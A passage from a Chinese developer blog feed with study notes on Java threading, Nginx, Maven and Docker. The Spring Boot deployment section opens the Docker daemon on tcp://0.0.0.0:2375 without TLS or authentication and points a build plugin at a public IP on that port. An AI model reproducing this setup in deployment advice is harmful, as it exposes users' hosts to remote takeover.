xxx)</li></ul></li></ol><p>###3.2.7 守护(daemon)线程</p><ol><li>线程分为<strong>用户线程</strong>和<strong>守护线程</strong></li><li>虚拟机必须确保用户线程(main)执行完毕</li><li>虚拟机不用等待守护线程(gc)执行完毕</li><li>如，后台记录操作日志，监控内存，垃圾回收等待</li></ol><hr><h1 id="第四章-线程同步（重点）"><a href="#第四章-线程同步（重点）" class="headerlink" title="第四章 线程同步（重点）"></a>第四章 线程同步（重点）</h1><ol><li><strong>多个线程操作同一个资源</strong></li><li>现实生活中，我们会遇到”同一个资源，多个人都想使用”的问题，比如，食堂排队打饭，每个人都想吃饭，最天然的解决方法就是，排队，一个个来；</li><li>处理多线程问题时，多线程访问同一个对象，并且某些线程还想修改这个对象。这个时候我们就需要线程同步，线程同步其实就是一种等待机制，多个需要同时访问此对象的线程进入这个<strong>对象的等待池</strong>形成队列，等待前面线程使用完毕，下一个线程再使用。</li><li>队列和锁：**每个对象都有一把锁。**队列+锁才可以保证线程的安全性。</li></ol><h2 id="4-1-线程同步"><a href="#4-1-线程同步" class="headerlink" title="4.1 线程同步"></a>4.1 线程同步</h2><ol><li>由于同一个进程的多个线程共享同一块存储空间，在带来方便的同时，也带来了访问冲突问题，为了保证数据在方法中被访问时的正确性，在访问时加入<strong>锁机制synchronized</strong>，当一个线程获得对象的排他锁，独占资源，其他线程必须等待，使用后释放锁即可，存在以下问题：<ul><li>一个线程持有锁会导致其他所有需要此锁的线程挂起；</li><li>在多线程竞争下，加锁，释放锁会导致比较多的上下文切换和调度延时，引起性能问题；</li><li>如果一个优先级高的线程等待一个优先级低的线程释放锁会导致优先级倒置，引起性能问题。</li></ul></li></ol><h2 id="4-2-同步方法"><a href="#4-2-同步方法" class="headerlink" title="4.2 同步方法"></a>4.2 同步方法</h2><ol><li>由于我们可以通过private关键字来保证数据对象只能被方法访问，所有我们只需要针对方法提出一套机制，这套机制就是synchronized关键字，它包括两种方法：synchaonized方法和synchronized快<code>同步方法:public synchronized void method(int ages){}</code></li><li>synchronized方法控制对“对象“的访问，每个对象对应一把锁，每个synchronized方法都必须获得调用该方法的对象的锁才能执行，否则线程会阻塞，方法一旦执行，就独占该锁，直到该方法返回才释放锁，后面被阻塞的线程才能获得这个锁，继续执行<code>缺陷:若将一个大的方法申明为synchronized将会影响效率</code></li></ol><h2 id="4-3-同步块"><a href="#4-3-同步块" class="headerlink" title="4.3 同步块"></a>4.3 同步块</h2><ol><li>同步快：synchronized(Obj){}</li><li>Obj称之为<strong>同步监视器</strong><ul><li>Obj可以是任何对象，但是推荐使用共享资源作为同步监视器</li><li>同步方法中无需指定同步监视器，因为同步方法的同步监视器就是this, 就是这个对象本身，活着是class[反射中讲解]</li></ul></li><li>同步监视器的执行过程<ul><li>第一个线程访问，锁定同步监视器，执行其中代码；</li><li>第二个线程访问，发现同步监视器被锁定，无法访问；</li><li>第一个线程访问完毕，解锁同步监视器；</li><li>第二个线程访问，发现同步监视器没有锁，然后锁定并访问。</li></ul></li></ol><h2 id="4-4-死锁"><a href="#4-4-死锁" class="headerlink" title="4.4 死锁"></a>4.4 死锁</h2><ol><li>多个线程各自占有一些共享资源，并且互相等待其他线程占有的资源才能进行，而导致两个或者多个线程都在等待对方释放资源，都停止执行的情形，某一个同步块同时拥有“两个以上对象的锁“时，就可能会发生“死锁“的问题。</li></ol><h2 id="4-5-死锁的避免方法"><a href="#4-5-死锁的避免方法" class="headerlink" title="4.5 死锁的避免方法"></a>4.5 死锁的避免方法</h2><p><strong>产生死锁的四个必要条件</strong></p><ol><li>互斥条件：一个资源每次只能被一个进程使用</li><li>请求与保持条件：一个进程因请求资源而阻塞时，对已获得的资源保持不放</li><li>不剥夺条件：进程以获得的资源，在未使用完之前，不能强行剥夺</li><li>循环等待条件：若干进程之间形成一种头尾相接的循环等待资源关系。</li></ol><h2 id="4-6Lock-锁"><a href="#4-6Lock-锁" class="headerlink" title="4.6Lock(锁)"></a>4.6Lock(锁)</h2><ol><li>从JDK5.0开始，Java提供了更强大的线程同步机制–通过显示定义锁对象来实现同步。同步锁使用Lock对象充当。</li><li>Java.util.concurrenrt.locks.Lock接口是控制多个线程</li></ol><hr><h2 id="4-4-并发"><a href="#4-4-并发" class="headerlink" title="4.4 并发"></a>4.4 并发</h2><p><strong>同一个对象被多个线程操作</strong></p><hr><h1 id="第五章-线程通信问题"><a href="#第五章-线程通信问题" class="headerlink" title="第五章 线程通信问题"></a>第五章 线程通信问题</h1><hr><h1 id="第六章-高级主题"><a href="#第六章-高级主题" class="headerlink" title="第六章 高级主题"></a>第六章 高级主题</h1><hr><h1 id="Java-Util"><a href="#Java-Util" class="headerlink" title="Java Util"></a>Java Util</h1><pre><code class="hljs java">本周周一<span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">nowMonday</span> <span class="hljs-operator">=</span> LocalDateTime.of(LocalDate.now(), LocalTime.MIN).with(DayOfWeek.MONDAY);上周周一<span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">lastMonday</span> <span class="hljs-operator">=</span> LocalDateTime.of(LocalDate.now(),LocalTime.MIN).minusWeeks(<span class="hljs-number">1</span>).with(DayOfWeek.MONDAY);计算时间差 <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> LocalDateTime.now().plusDays(-<span class="hljs-number">7</span>); <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">endTime</span> <span class="hljs-operator">=</span> LocalDateTime.now(); <span class="hljs-type">Duration</span> <span class="hljs-variable">duration</span> <span class="hljs-operator">=</span> Duration.between(startTime, endTime); duration.toDays();  <span class="hljs-comment">// 获取相差天数</span> duration.toMillis();language-java复制代码</code></pre><h1 id="第一章-对象导论"><a href="#第一章-对象导论" class="headerlink" title="第一章 对象导论"></a>第一章 对象导论</h1><h2 id="1-1-抽象过程"><a href="#1-1-抽象过程" class="headerlink" title="1.1 抽象过程"></a>1.1 抽象过程</h2><p><strong>我们将问题空间中的元素及其在解空间中的表示称为“对象“。（你还需要一些无法类比为问题空间元素的对象。）这种思想的实质是：程序可以通过添加新类型的对象使自身适用于某个特定问题。</strong></p><ol><li>万物皆为对象。</li><li>程序是对象的集合，它们通过发送消息来告知彼此所要做的。</li><li>每个对象都有自己的由其他对于所构成的存储。</li><li>每个对象都拥有其类型。</li><li>某一特定类型的所有对象都可以接收同样的消息。</li></ol><h2 id="1-2-每个对象都有一个接口"><a href="#1-2-每个对象都有一个接口" class="headerlink" title="1.2 每个对象都有一个接口"></a>1.2 每个对象都有一个接口</h2><h2 id="1-3-每个对象都提供服务"><a href="#1-3-每个对象都提供服务" class="headerlink" title="1.3 每个对象都提供服务"></a>1.3 每个对象都提供服务</h2><h2 id="1-4-被隐藏的具体实现"><a href="#1-4-被隐藏的具体实现" class="headerlink" title="1.4 被隐藏的具体实现"></a>1.4 被隐藏的具体实现</h2><h2 id="1-5-复用具体实现"><a href="#1-5-复用具体实现" class="headerlink" title="1.5 复用具体实现"></a>1.5 复用具体实现</h2><h2 id="1-6-继承"><a href="#1-6-继承" class="headerlink" title="1.6 继承"></a>1.6 继承</h2><h2 id="1-7-伴随多态的可交互换对象"><a href="#1-7-伴随多态的可交互换对象" class="headerlink" title="1.7 伴随多态的可交互换对象"></a>1.7 伴随多态的可交互换对象</h2><h2 id="1-8-单根继承结构"><a href="#1-8-单根继承结构" class="headerlink" title="1.8 单根继承结构"></a>1.8 单根继承结构</h2><h2 id="1-9-容器"><a href="#1-9-容器" class="headerlink" title="1.9 容器"></a>1.9 容器</h2><h2 id="1-10-对象的创建和生命期"><a href="#1-10-对象的创建和生命期" class="headerlink" title="1.10 对象的创建和生命期"></a>1.10 对象的创建和生命期</h2><h2 id="1-11-异常处理：处理错误"><a href="#1-11-异常处理：处理错误" class="headerlink" title="1.11 异常处理：处理错误"></a>1.11 异常处理：处理错误</h2><h2 id="1-12-并发编程"><a href="#1-12-并发编程" class="headerlink" title="1.12 并发编程"></a>1.12 并发编程</h2><ol><li>在计算机编程中有一个基本概念，就是在同一时刻处理多个任务的思想。许多程序设计问题都要求，程序能够停下正在做的工作，转而处理某个其他问题，然后再返回主进程。有许多方法可以实现这个目的。最初，程序员们用所掌握的有关机器底层的知识来编写中断服务程序，主进程的挂起是通过硬件中断来触发的。尽管这样做可以解决问题，但是其难度太大，而且不能移植，所以使得将程序移植到新型号的机器上时，即费时又费力。</li><li>又是中断对于处理时间性强的任务是必需的，但是对于大量的其他问题，我们只是想把问题切分成多个可独立运行的部分（任务），从而提高程序的响应能力。在程序中，这些彼此独立运行的部分称之为线程，上述概念被成为“并发“。并发最常见的例子就是用户界面。通过使用任务，用户可以在掀起揿下按钮后快速得到一个响应，而不用被迫等待到程序完成当前任务为止。</li><li>通常，线程只是一种为单一处理器分配执行时间的手段。但是如果操作系统支持多处理器，那么每个任务都可以被指派给不同的处理器，并且它们是在真正地并行执行。在语言级别上，多线程所带来的便利之一便是程序员不用再操心机器上是有多个处理器还是只有一个处理器。由于程序在逻辑上被分为线程，所以如果机器拥有多个处理器，那么程序不需要特殊调整也能执行得更快。</li><li>所有这些都使得并发看起来相当简单，但是有一个隐患：共享资源。如果有多个并行任务都要访问同一项资源，那么就会出问题。例如，两个进程不能同时向一台打印机发送信息。为了解决这个问题，可以共享的资源，例如打印机，必须在使用期间被锁定。因此，整个过程是：某个任务锁定某项资源，完成其任务，然后释放资源锁，使其他任务可以使用这项资源。</li><li>Java的并发是内置于语言中的，Java SE5已经增添来大量格外的库支持。</li></ol><h2 id="1-13-Java与Internet"><a href="#1-13-Java与Internet" class="headerlink" title="1.13 Java与Internet"></a>1.13 Java与Internet</h2><h2 id="1-14-总结"><a href="#1-14-总结" class="headerlink" title="1.14 总结"></a>1.14 总结</h2><hr>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Nginx</title>
      <link href="/2021/08/11/Nginx/"/>
      <url>/2021/08/11/Nginx/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Nginx作用"><a href="#1-Nginx作用" class="headerlink" title="1. Nginx作用"></a>1. Nginx作用</h1><pre><code class="hljs java"><span class="hljs-number">1.</span> Http代理，反向代理：作为web服务器最常用的功能之一，尤其是反向代理。<span class="hljs-number">2.</span> Nginx提供的负载均衡策略有<span class="hljs-number">2</span>种：内置策略和扩展策略。内置策略为轮询，加权轮询，Ip hash。扩展策略，就天马行空，只有你想不到的没有他做不到的。iphash对客户端请求的ip进行hash操作，然后根据hash结果将同一个客户端ip的请求分发给同一台服务器进行处理，可以解决session不共享的问题。<span class="hljs-number">3.</span> 动静分离，在我们的软件开发中，有些请求是需要后台处理的，有些请求是不需要经过后台处理的（如：css、html、jpg、js等等文件），这些不需要经过后台处理的文件称为静态文件。让动态网站里的动态网页根据一定规则把不变的资源和经常变的资源区分开来，动静资源做好了拆分以后，我们就可以根据静态资源的特点将其做缓存操作。提高资源响应的速度。language-java复制代码</code></pre><hr><h1 id="2-linux下安装Nginx"><a href="#2-linux下安装Nginx" class="headerlink" title="2. linux下安装Nginx"></a>2. linux下安装Nginx</h1><ol><li>安装gcc</li></ol><pre><code class="hljs shell">yum install gcc-c++language-shell复制代码</code></pre><ol><li>PCRE pcre-devel 安装</li></ol><pre><code class="hljs shell">yum install -y pcre pcre-devellanguage-shell复制代码</code></pre><ol><li>zlib 安装</li></ol><pre><code class="hljs shell">yum install -y zlib zlib-devellanguage-shell复制代码</code></pre><ol><li>OpenSSL 安装</li></ol><pre><code class="hljs shell">yum install -y openssl openssl-devellanguage-shell复制代码</code></pre><ol><li>下载安装包<a href="https://nginx.org/en/download.html">链接</a></li><li>解压</li></ol><pre><code class="hljs shell">tar -zxvf nginx-1.18.0.tar.gzcd nginx-1.18.0language-shell复制代码</code></pre><ol><li>配置</li></ol><pre><code class="hljs shell">./configuremakemake installlanguage-shell复制代码</code></pre><ol><li>查找安装路径</li></ol><pre><code class="hljs shell">whereis nginxlanguage-shell复制代码</code></pre><ol><li>Nginx常用命令</li></ol><pre><code class="hljs shell">cd /usr/local/nginx/sbin/./nginx  启动./nginx -s stop  停止./nginx -s quit  安全退出./nginx -s reload  重新加载配置文件ps aux|grep nginx  查看nginx进程language-shell复制代码</code></pre><ol><li>Linux其他相关命令</li></ol><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">开启</span>service firewalld start<span class="hljs-meta prompt_"># </span><span class="language-bash">重启</span>service firewalld restart<span class="hljs-meta prompt_"># </span><span class="language-bash">关闭</span>service firewalld stop<span class="hljs-meta prompt_"># </span><span class="language-bash">查看防火墙规则</span>firewall-cmd --list-all<span class="hljs-meta prompt_"># </span><span class="language-bash">查询端口是否开放</span>firewall-cmd --query-port=8080/tcp<span class="hljs-meta prompt_"># </span><span class="language-bash">开放80端口</span>firewall-cmd --permanent --add-port=80/tcp<span class="hljs-meta prompt_"># </span><span class="language-bash">移除端口</span>firewall-cmd --permanent --remove-port=8080/tcp<span class="hljs-meta prompt_">#</span><span class="language-bash">重启防火墙(修改配置后要重启防火墙)</span>firewall-cmd --reload<span class="hljs-meta prompt_"># </span><span class="language-bash">参数解释</span>1. firwall-cmd：是Linux提供的操作firewall的一个工具；2. --permanent：表示设置为持久；3. --add-port：标识添加的端口；language-shell复制代码</code></pre><ol><li>负载均衡联系</li></ol><pre><code class="hljs shell">upstream lb&#123;    server 127.0.0.1:8080 weight=1;    server 127.0.0.1:8081 weight=1;&#125;location / &#123;    proxy_pass http://lb;&#125;language-shell复制代码</code></pre>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Maven</title>
      <link href="/2021/08/06/Maven/"/>
      <url>/2021/08/06/Maven/</url>
      
        <content type="html"><![CDATA[<h1 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h1><h2 id="1-本地仓库位置修改"><a href="#1-本地仓库位置修改" class="headerlink" title="1. 本地仓库位置修改"></a>1. 本地仓库位置修改</h2><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">localRepository</span>&gt;</span>D:\tools\repository<span class="hljs-tag">&lt;/<span class="hljs-name">localRepository</span>&gt;</span>language-xml复制代码</code></pre><h2 id="2-修改maven默认的JDK版本"><a href="#2-修改maven默认的JDK版本" class="headerlink" title="2. 修改maven默认的JDK版本"></a>2. 修改maven默认的JDK版本</h2><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">profile</span>&gt;</span>         <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>JDK-1.8<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>           <span class="hljs-tag">&lt;<span class="hljs-name">activation</span>&gt;</span>               <span class="hljs-tag">&lt;<span class="hljs-name">activeByDefault</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">activeByDefault</span>&gt;</span>               <span class="hljs-tag">&lt;<span class="hljs-name">jdk</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">jdk</span>&gt;</span>           <span class="hljs-tag">&lt;/<span class="hljs-name">activation</span>&gt;</span>           <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>               <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span>               <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span>               <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.compilerVersion</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.compilerVersion</span>&gt;</span>           <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>       <span class="hljs-tag">&lt;/<span class="hljs-name">profile</span>&gt;</span>language-xml复制代码</code></pre><h2 id="3-添加国内镜像源"><a href="#3-添加国内镜像源" class="headerlink" title="3. 添加国内镜像源"></a>3. 添加国内镜像源</h2><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 阿里云仓库 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mirror</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>alimaven<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">mirrorOf</span>&gt;</span>central<span class="hljs-tag">&lt;/<span class="hljs-name">mirrorOf</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>aliyun maven<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/repositories/central/<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mirror</span>&gt;</span><span class="hljs-comment">&lt;!-- 中央仓库1 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mirror</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>repo1<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">mirrorOf</span>&gt;</span>central<span class="hljs-tag">&lt;/<span class="hljs-name">mirrorOf</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Human Readable Name for this Mirror.<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>http://repo1.maven.org/maven2/<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mirror</span>&gt;</span><span class="hljs-comment">&lt;!-- 中央仓库2 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mirror</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>repo2<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">mirrorOf</span>&gt;</span>central<span class="hljs-tag">&lt;/<span class="hljs-name">mirrorOf</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Human Readable Name for this Mirror.<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>http://repo2.maven.org/maven2/<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mirror</span>&gt;</span>language-xml复制代码</code></pre><h2 id="4-常用IDE下配置Maven"><a href="#4-常用IDE下配置Maven" class="headerlink" title="4. 常用IDE下配置Maven"></a>4. 常用IDE下配置Maven</h2><pre><code class="hljs xml">1：此处修改为自己解压的Maven目录2：勾选Override，修改为自己目录下的settings.xml目录3：修改为自己的本地仓库地址，一般会自动识别。language-xml复制代码</code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Springboot项目</title>
      <link href="/2021/07/31/Springboot%E9%A1%B9%E7%9B%AE/"/>
      <url>/2021/07/31/Springboot%E9%A1%B9%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="Docker部署Springboot项目"><a href="#Docker部署Springboot项目" class="headerlink" title="Docker部署Springboot项目"></a>Docker部署Springboot项目</h2><h3 id="1-docker-开启远程连接"><a href="#1-docker-开启远程连接" class="headerlink" title="1. docker 开启远程连接"></a>1. docker 开启远程连接</h3><ol><li>编辑docker.service文件</li></ol><pre><code class="hljs shell">vi /usr/lib/systemd/system/docker.servicelanguage-shell复制代码</code></pre><ol><li>修改 ExecStart 属性</li></ol><pre><code class="hljs shell">ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock -H tcp://0.0.0.0:2375language-shell复制代码</code></pre><ol><li>重新加载Docker配置生效</li></ol><pre><code class="hljs shell">systemctl daemon-reload systemctl restart dockerlanguage-shell复制代码</code></pre><hr><h3 id="2-IDEA-配置"><a href="#2-IDEA-配置" class="headerlink" title="2. IDEA 配置"></a>2. IDEA 配置</h3><ol><li>连接docker</li></ol><pre><code class="hljs shell">tcp://ip:2375language-shell复制代码</code></pre><ol><li>配置镜像加速器</li></ol><pre><code class="hljs shell">https://xsxk9861.mirror.aliyuncs.comlanguage-shell复制代码</code></pre><ol><li>集成mavn插件 pom.xml</li></ol><pre><code class="hljs xml">    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span>        <span class="hljs-comment">&lt;!--docker镜像前缀名称--&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">docker.image.prefix</span>&gt;</span>java<span class="hljs-tag">&lt;/<span class="hljs-name">docker.image.prefix</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>language-xml复制代码          <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.spotify<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>docker-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>                    <span class="hljs-comment">&lt;!--远程docker的地址--&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">dockerHost</span>&gt;</span>http://45.77.120.192:2375<span class="hljs-tag">&lt;/<span class="hljs-name">dockerHost</span>&gt;</span>                    <span class="hljs-comment">&lt;!--镜像名称，前缀/项目名--&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">imageName</span>&gt;</span>$&#123;docker.image.prefix&#125;/$&#123;project.artifactId&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">imageName</span>&gt;</span>                    <span class="hljs-comment">&lt;!--Dockerfile的位置--&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">dockerDirectory</span>&gt;</span>src/main/docker<span class="hljs-tag">&lt;/<span class="hljs-name">dockerDirectory</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">resources</span>&gt;</span>                        <span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span>                            <span class="hljs-tag">&lt;<span class="hljs-name">targetPath</span>&gt;</span>/<span class="hljs-tag">&lt;/<span class="hljs-name">targetPath</span>&gt;</span>                            <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>$&#123;project.build.directory&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span>                            <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>$&#123;project.build.finalName&#125;.jar<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span>                        <span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span>                    <span class="hljs-tag">&lt;/<span class="hljs-name">resources</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>language-xml复制代码</code></pre><ol><li>创建src&#x2F;main&#x2F;docker&#x2F;Dockerfile</li></ol><pre><code class="hljs dockerfile"><span class="hljs-comment">#依赖jdk8</span><span class="hljs-keyword">FROM</span> java:<span class="hljs-number">8</span><span class="hljs-comment"># 维护者信息</span><span class="hljs-keyword">MAINTAINER</span> hjxstart hjxstart@<span class="hljs-number">126</span>.com<span class="hljs-comment">#容器卷</span><span class="hljs-keyword">VOLUME</span><span class="language-bash"> /tmp</span><span class="hljs-comment">#拷贝jar包</span><span class="hljs-keyword">ADD</span><span class="language-bash"> internal-system-java-0.0.1-SNAPSHOT.jar /test.jar</span><span class="hljs-comment">#暴漏端口</span><span class="hljs-comment"># EXPOSE 8080</span><span class="hljs-comment">#容器启动时执行</span><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [ <span class="hljs-string">&quot;java&quot;</span>, <span class="hljs-string">&quot;-Djava.security.egd=file:/dev/./urandom&quot;</span>, <span class="hljs-string">&quot;-jar&quot;</span>, <span class="hljs-string">&quot;/test.jar&quot;</span> ]</span>language-dockerfile复制代码</code></pre><h3 id="3-打包部署"><a href="#3-打包部署" class="headerlink" title="3. 打包部署"></a>3. 打包部署</h3><ol><li>使用Plugins插件分别运行build</li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker</title>
      <link href="/2021/07/22/Docker/"/>
      <url>/2021/07/22/Docker/</url>
      
        <content type="html"><![CDATA[<h1 id="第一章-基础篇"><a href="#第一章-基础篇" class="headerlink" title="第一章 基础篇"></a>第一章 基础篇</h1><h2 id="1-1-Docker安装"><a href="#1-1-Docker安装" class="headerlink" title="1.1 Docker安装"></a>1.1 Docker安装</h2><p><a href="https://docs.docker.com/engine/install/centos/">Docker官网安装教程</a></p><ol><li>卸载旧版本</li></ol><pre><code class="hljs shell">sudo yum remove docker \                  docker-client \                  docker-client-latest \                  docker-common \                  docker-latest \                  docker-latest-logrotate \                  docker-logrotate \                  docker-enginelanguage-shell复制代码</code></pre><ol><li>安装需要的安装包</li></ol><pre><code class="hljs shell">sudo yum install -y yum-utilslanguage-shell复制代码</code></pre><ol><li>设置设置yum源</li></ol><pre><code class="hljs shell">sudo yum-config-manager \--add-repo \ https://download.docker.com/linux/centos/docker-ce.repolanguage-shell复制代码</code></pre><ol><li>更新 yum 软件包索引</li></ol><pre><code class="hljs shell">sudo yum makecache fastlanguage-shell复制代码</code></pre><ol><li>安装docker相关的内容</li></ol><pre><code class="hljs shell">sudo yum install docker-ce docker-ce-cli containerd.iolanguage-shell复制代码</code></pre><ol><li>启动docker</li></ol><pre><code class="hljs shell">sudo systemctl start dockerdocker versionlanguage-shell复制代码</code></pre><ol><li>运行 HelloWorld</li></ol><pre><code class="hljs shell">sudo docker run hello-worldlanguage-shell复制代码</code></pre><ol><li>卸载 Docker</li></ol><pre><code class="hljs shell">sudo yum remove docker-ce docker-ce-cli containerd.iosudo rm -rf /var/lib/dockersudo rm -rf /var/lib/containerdlanguage-shell复制代码</code></pre><ol><li>阿里云镜像加速 <a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors">链接</a></li></ol><pre><code class="hljs shell">sudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;&#123;  &quot;registry-mirrors&quot;: [&quot;https://xsxk9861.mirror.aliyuncs.com&quot;]&#125;EOFsudo systemctl daemon-reloadsudo systemctl restart dockerlanguage-shell复制代码</code></pre><hr><h2 id="1-3-HelloWorld运行过程"><a href="#1-3-HelloWorld运行过程" class="headerlink" title="1.3 HelloWorld运行过程"></a>1.3 HelloWorld运行过程</h2><h2 id="1-4-常用命令"><a href="#1-4-常用命令" class="headerlink" title="1.4 常用命令"></a>1.4 常用命令</h2><hr><h1 id="第二章-进阶篇"><a href="#第二章-进阶篇" class="headerlink" title="第二章 进阶篇"></a>第二章 进阶篇</h1><h2 id="2-1-Docker-镜像"><a href="#2-1-Docker-镜像" class="headerlink" title="2.1 Docker 镜像"></a>2.1 Docker 镜像</h2><h2 id="2-2-容器数据卷"><a href="#2-2-容器数据卷" class="headerlink" title="2.2 容器数据卷"></a>2.2 容器数据卷</h2><h2 id="2-3-DockerFile"><a href="#2-3-DockerFile" class="headerlink" title="2.3 DockerFile"></a>2.3 DockerFile</h2><h2 id="2-4-Docker-网络原理"><a href="#2-4-Docker-网络原理" class="headerlink" title="2.4 Docker 网络原理"></a>2.4 Docker 网络原理</h2><h3 id="2-4-1-原理"><a href="#2-4-1-原理" class="headerlink" title="2.4.1 原理"></a>2.4.1 原理</h3><ol><li>启动一个docker容器，docker就会给docker容器分配一个ip。</li><li>安装docker就会有一张docker0网卡，桥接模式，使用evth-pair技术！</li><li>evth-pair就是一对的虚拟设备接口，他们都是成对出现的，一端连着协议，一端彼此相连</li><li>结论：容器和容器之间是可以互相ping通</li><li>Docker中的所有的网络接口都是虚拟的。虚拟的转发效率高！（内网传递文件）</li><li>只要容器删除，对应网桥一对就没有了。</li><li>实战：容器之间ip地址通信</li></ol><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">安装tomcat</span>docker run -d -P --name tomcat01 tomcat<span class="hljs-meta prompt_"># </span><span class="language-bash">查看容器ip地址</span>docker exec -it tomcat01 ip addr<span class="hljs-meta prompt_"># </span><span class="language-bash">在启动一个容器测试，发现又多了一对网卡，例如：14: eth0@if15</span>language-shell复制代码</code></pre><hr><h3 id="2-4-2-link-不推荐使用"><a href="#2-4-2-link-不推荐使用" class="headerlink" title="2.4.2 link(不推荐使用)"></a>2.4.2 link(不推荐使用)</h3><ol><li>实战：容器之间容器通过name通信</li></ol><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">实现: docker <span class="hljs-built_in">exec</span> -it tomcat02 ping tomcat03</span><span class="hljs-meta 